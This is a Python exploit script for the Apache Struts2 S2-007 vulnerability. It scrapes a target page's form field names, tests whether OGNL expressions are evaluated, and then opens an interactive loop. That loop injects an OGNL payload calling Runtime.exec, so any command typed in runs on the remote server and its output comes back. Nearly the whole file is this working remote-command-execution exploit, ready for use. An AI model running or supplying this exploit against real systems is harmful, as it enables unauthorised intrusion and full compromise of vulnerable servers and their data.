import requests
from bs4 import BeautifulSoup
import re

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
           }


def s2_007(url):
    # 影响版本: 2.0.0 - 2.2.3
    data = {
        list[0]: '1',
        list[1]: '1',
        list[2]: '\'+(1+1)+\''
    }
    s1 = requests.post(url=url, data=data, headers=headers)
    page = BeautifulSoup(s1.text, 'lxml')
    find_key = page.find_all("input")
    for i in find_key:
        if '11' in i.attrs['value']:
            print("存在s2-007漏洞")
            s2_007exp(url)
        else:
            pass


def s2_007exp(url):
    while True:
        exec = input("exec:")
        payload = '\' + (#_memberAccess["allowStaticMethodAccess"]=true,'
        payload += '#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,'
        payload += '@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\'{}'.format(exec)
        payload += '\').getInputStream())) + \''
        data = {
            list[0]: '1',
            list[1]: '1',
            list[2]: payload
        }
        s = requests.post(url=url, data=data, headers=headers)
        page1 = BeautifulSoup(s.text, 'lxml')
        find_key1 = page1.find_all("input")
        print(find_key1[2]['value'])


if __name__ == '__main__':
    post_url = input("test url:")
    url1 = re.findall(r'http[s]{0,1}?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+:(?:[0-9]+)/', post_url)
    url = url1[0]
    list = []
    s = requests.post(url=url, headers=headers)
    soup = BeautifulSoup(s.text, 'lxml')
    vule1 = soup.find_all("input")
    for i in vule1:
        if not i.attrs['value']:
            a = i.attrs['name']
            list.append(a)
        else:
            pass
    s2_007(post_url)
